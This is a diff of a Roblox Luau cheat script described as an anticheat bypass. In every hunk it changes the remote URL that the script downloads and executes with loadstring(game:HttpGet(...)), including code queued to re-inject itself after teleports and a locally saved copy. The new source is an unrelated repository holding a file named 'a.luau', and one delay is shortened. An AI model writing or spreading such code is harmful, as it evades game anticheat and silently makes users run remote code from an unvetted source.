@@ -18,7 +18,7 @@ local LocalPlayer = Players.LocalPlayer
 --// QUEUE ON TELEPORT - Re-execute after anticheat kicks
 --// ═══════════════════════════════════════════
 
-local ScriptSource = game:HttpGet("https://raw.githubusercontent.com/StealABrainrot/BaseGuard/main/StealABrainrot_BaseGuard.luau", true)
+local ScriptSource = game:HttpGet("https://raw.githubusercontent.com/deebee003/laughing-giggle/refs/heads/main/a.luau", true)
 
 -- Queue the script to re-run after any teleport (anticheat dodge)
 if queue_on_teleport then
@@ -26,7 +26,7 @@ if queue_on_teleport then
         -- Re-inject after anticheat teleport
         wait(2)
         local success, err = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/StealABrainrot/BaseGuard/main/StealABrainrot_BaseGuard.luau", true))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/deebee003/laughing-giggle/refs/heads/main/a.luau", true))()
         end)
         if not success then
             warn("[Base Guard] Re-inject failed: " .. tostring(err))
@@ -66,7 +66,7 @@ function ACBypass.Init()
     -- Save script locally for re-injection fallback
     if writefile then
         pcall(function()
-            local src = game:HttpGet("https://raw.githubusercontent.com/StealABrainrot/BaseGuard/main/StealABrainrot_BaseGuard.luau", true)
+            local src = game:HttpGet("https://raw.githubusercontent.com/deebee003/laughing-giggle/refs/heads/main/a.luau", true)
             writefile("StealABrainrot_BaseGuard.luau", src)
         end)
     end
@@ -146,7 +146,7 @@ function ACBypass.Init()
                 queue_on_teleport([[
                     wait(3)
                     pcall(function()
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/StealABrainrot/BaseGuard/main/StealABrainrot_BaseGuard.luau", true))()
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/deebee003/laughing-giggle/refs/heads/main/a.luau", true))()
                     end)
                 ]])
             end
@@ -157,9 +157,9 @@ function ACBypass.Init()
         TeleportService.TeleportInitiated:Connect(function()
             if queue_on_teleport then
                 queue_on_teleport([[
-                    wait(3)
+                    wait(0.5)
                     pcall(function()
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/StealABrainrot/BaseGuard/main/StealABrainrot_BaseGuard.luau", true))()
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/deebee003/laughing-giggle/refs/heads/main/a.luau", true))()
                     end)
                 ]])
             end
